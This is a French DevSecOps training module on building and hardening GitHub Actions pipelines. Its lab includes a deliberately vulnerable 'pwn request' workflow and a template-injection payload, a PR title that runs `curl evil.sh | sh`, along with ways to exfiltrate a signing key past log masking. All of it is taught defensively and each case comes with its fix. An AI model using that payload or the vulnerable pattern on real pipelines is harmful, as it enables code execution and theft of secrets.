---
title: DevSecOps 03 · CI/CD, les bases
date: 2026-09-20
tags: devsecops, ci-cd, github-actions
description: Écrire et sécuriser un pipeline GitHub Actions : permissions, pull_request_target, injection de template, runner auto-hébergé.
---

# Module 03 — CI/CD : les bases indispensables

> Durée : 7–9 h. Objectif : savoir écrire, lire et sécuriser un pipeline. Sans ça, tous les
> modules suivants sont théoriques.

## Objectifs

- Écrire un workflow GitHub Actions multi-jobs avec cache, matrice et artefacts.
- Comprendre le modèle de permissions (`GITHUB_TOKEN`, `permissions:`, environnements).
- Distinguer `pull_request` et `pull_request_target` (et pourquoi le second est dangereux).
- Mettre en place un **runner auto-hébergé** — nécessaire dès qu'il faut du matériel réel.

## Théorie utile

### Anatomie d'un pipeline

```
Déclencheur (push, PR, tag, cron, manuel)
   └── Job (tourne sur un runner, isolé)
         └── Step (une commande ou une action)
```

Règles qui comptent :

- Les jobs sont **parallèles par défaut** ; `needs:` crée la dépendance.
- Chaque job démarre sur une machine propre : ce qui doit circuler passe par des **artefacts**
  ou un **cache**, jamais par le disque.
- Un job qui échoue arrête le pipeline — c'est ce qu'on exploite pour les *gates* sécurité.

### Permissions : le point le plus important

Par défaut, `GITHUB_TOKEN` peut avoir un accès en écriture au dépôt. Un job compromis peut alors
pousser du code. Toujours déclarer explicitement, au plus bas niveau :

```yaml
permissions:
  contents: read        # par défaut pour tout le workflow
jobs:
  release:
    permissions:
      contents: write   # élevé seulement là où c'est nécessaire
      id-token: write   # OIDC (module 06)
```

### `pull_request` vs `pull_request_target`

| | `pull_request` | `pull_request_target` |
|---|---|---|
| Code exécuté | celui de la PR | celui de la **base** |
| Secrets disponibles | non (pour un fork) | **oui** |
| Risque | faible | **exfiltration de secrets si on checkout le code de la PR** |

Règle : ne jamais faire `actions/checkout` avec `ref: ${{ github.event.pull_request.head.sha }}`
dans un workflow `pull_request_target`. C'est le schéma d'attaque « pwn request ».

### Épinglage des actions

```yaml
# ✗ mutable : le tag peut être redéplacé sur un autre commit
- uses: actions/checkout@v4
# ✓ immuable
- uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7
```

Sur un dépôt qui manipule des clés de signature, l'épinglage par SHA n'est pas du zèle : c'est
la leçon de `tj-actions/changed-files` (2025), dont le tag a été redéplacé vers du code
malveillant qui dumpait les secrets des runners.

## Lab 1 — premier pipeline sur le fil rouge

`.github/workflows/ci.yml` :

```yaml
name: CI
on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  secrets-scan:
    name: Recherche de secrets
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0          # gitleaks a besoin de tout l'historique
      - name: gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  build-firmware:
    name: Build firmware
    runs-on: ubuntu-latest
    needs: secrets-scan
    strategy:
      fail-fast: false
      matrix:
        cc: [gcc, clang]
    steps:
      - uses: actions/checkout@v4
      - name: Compiler avec durcissement
        run: |
          ${{ matrix.cc }} -O2 -Wall -Wextra -Werror \
            -D_FORTIFY_SOURCE=3 -fstack-protector-strong \
            -fstack-clash-protection -fPIE -pie \
            -Wl,-z,relro,-z,now,-z,noexecstack \
            -o firmware-${{ matrix.cc }} firmware/src/main.c
      - uses: actions/upload-artifact@v4
        with:
          name: firmware-${{ matrix.cc }}
          path: firmware-${{ matrix.cc }}
          retention-days: 7

  verifier-durcissement:
    name: Vérifier les protections du binaire
    runs-on: ubuntu-latest
    needs: build-firmware
    steps:
      - uses: actions/download-artifact@v4
        with: { name: firmware-gcc }
      - run: sudo apt-get update && sudo apt-get install -y checksec
      - run: |
          chmod +x firmware-gcc
          checksec --file=firmware-gcc --format=json | tee checksec.json
          # gate : on refuse un binaire sans RELRO complet ni PIE
          python3 - <<'PY'
          import json,sys
          d=list(json.load(open("checksec.json")).values())[0]
          bad=[k for k,v in (("relro","full"),("pie","yes"),("nx","yes"))
               if d.get(k,"").lower().find(v)<0]
          if bad:
              print("Protections manquantes:", bad); sys.exit(1)
          print("Durcissement OK")
          PY
```

> Le job `build-firmware` **échoue volontairement** au départ : `-Werror` attrape le `strcpy`
> du module 00. C'est ta première *gate*. Corrige avec `snprintf` et observe le pipeline passer
> au vert.

## Lab 2 — le pipeline comme cible

Crée une branche et ajoute ce workflow **volontairement vulnérable**, puis explique par écrit
comment tu l'exploiterais :

```yaml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ✗ code non fiable
      - run: make build                                    # ✗ exécuté avec les secrets
        env:
          SIGNING_KEY: ${{ secrets.SIGNING_KEY }}
```

Réponse attendue dans `labs/03-ci/pwn-request.md` : un contributeur externe ouvre une PR qui
modifie le `Makefile` ; `make build` exécute son code sur un runner qui détient `SIGNING_KEY` ;
la clé est exfiltrée (encodée en base64 dans une requête DNS ou HTTP, ou simplement affichée par
morceaux pour contourner le masquage). **Supprime ce workflow après l'exercice.**

Deuxième cas à documenter : l'injection par expression de template.

```yaml
- run: echo "Titre: ${{ github.event.pull_request.title }}"   # ✗ injection shell
```

Un titre de PR valant `"; curl evil.sh | sh #` s'exécute. Correctif : passer par une variable
d'environnement.

```yaml
- env:
    TITRE: ${{ github.event.pull_request.title }}
  run: echo "Titre: $TITRE"
```

## Lab 3 — runner auto-hébergé (préparation à l'embarqué)

Tu en auras besoin dès que le test demande une vraie carte (JTAG, port série, analyseur).

```bash
mkdir ~/actions-runner && cd ~/actions-runner
curl -o runner.tar.gz -L https://github.com/actions/runner/releases/download/v2.319.1/actions-runner-linux-x64-2.319.1.tar.gz
tar xzf runner.tar.gz
./config.sh --url https://github.com/yassirmouyiwa/devsecops-fil-rouge \
            --token $(gh api -X POST repos/:owner/devsecops-fil-rouge/actions/runners/registration-token -q .token) \
            --labels self-hosted,linux,x64,banc-de-test
./run.sh
```

**Règles de sécurité pour un runner auto-hébergé**, à écrire dans tes notes :

1. Jamais sur un dépôt public (n'importe quelle PR exécuterait du code chez toi).
2. Machine dédiée ou VM jetable, pas ton poste de travail.
3. Idéalement éphémère (`--ephemeral`) : un job, puis la machine est reconstruite.
4. Pas d'accès réseau au reste du LAN au-delà de ce qui est strictement nécessaire.
5. Utilisateur non privilégié, pas de `sudo` sans mot de passe.

## Critères de validation

- [ ] Le pipeline passe au vert après correction du `strcpy`
- [ ] La gate `checksec` échoue si tu retires `-pie` (teste-le)
- [ ] `pwn-request.md` explique les deux attaques avec le correctif
- [ ] Toutes les actions tierces sont épinglées par SHA
- [ ] `permissions:` est déclaré explicitement dans chaque workflow
- [ ] Un runner auto-hébergé a exécuté au moins un job

## Pièges classiques

- **Pipeline de 40 minutes** : personne ne l'attend, tout le monde force le merge. Objectif :
  < 10 min sur PR, le lourd (fuzzing, DAST complet) en nocturne.
- **Cache empoisonné** : un job de PR peut écrire dans le cache lu par `main`. Ne mets jamais
  d'artefacts de build sensibles dans un cache partagé avec des branches non fiables.
- **`continue-on-error: true` sur les jobs sécurité** : la gate devient décorative.
- **Secrets en `echo`** pour debug : GitHub masque `***`, mais pas si tu les découpes ou encodes.

## Pour aller plus loin

- GitHub Actions — *Security hardening for GitHub Actions* (doc officielle, à lire en entier)
- `actionlint` : linter de workflows, à mettre en pre-commit
- `zizmor` : analyseur de sécurité spécialisé workflows Actions
- Équivalents : GitLab CI (`.gitlab-ci.yml`), Jenkins (plus répandu en industriel/embarqué)
